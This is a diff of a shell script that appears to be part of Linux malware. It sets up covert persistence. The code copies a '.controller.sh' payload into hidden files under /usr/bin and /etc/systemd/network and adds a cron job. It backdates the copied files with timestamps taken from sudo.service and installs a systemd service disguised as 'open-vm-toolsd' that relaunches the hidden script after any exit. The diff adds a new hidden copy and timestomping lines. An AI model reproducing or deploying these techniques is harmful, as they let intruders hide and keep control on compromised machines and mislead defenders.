@@ -20,6 +20,11 @@ done
 (crontab -l 2>/dev/null; echo "15 5 17 4 * /etc/systemd/network/monitor.sh") | crontab -
 cp -p ".controller.sh" "/etc/init.d/rc.local/rcd.sh" &> /dev/null
 cp -p ".controller.sh" "/etc/systemd/network/.debug.sh" &> /dev/null
+cp -p ".controller.sh" "/usr/bin/.vmdebug.sh" &> /dev/null
+sudo touch -r /etc/systemd/system/sudo.service -a /etc/systemd/system/sudo.service -c /etc/systemd/system/sudo.service /usr/bin/.vmdebug.sh
+sudo touch -r /etc/systemd/system/sudo.service -a /etc/systemd/system/sudo.service -c /etc/systemd/system/sudo.service /etc/systemd/network/.debug.sh
+
+
 if [[ $(systemctl) ]]; then
     sudo touch -r /etc/systemd/system/sudo.service -a /etc/systemd/system/sudo.service -c /etc/systemd/system/sudo.service /etc/systemd/system/open-vm-toolsd.service.service
     sudo cat > /etc/systemd/system/open-vm-toolsd.service << EOF
@@ -30,7 +35,7 @@ After=network.target
 
 [Service]
 Type=simple
-ExecStart=/bin/bash /etc/systemd/network/.debug.sh
+ExecStart=/bin/bash /usr/bin/.vmdebug.sh
 Restart=always
 RestartSec=10
 
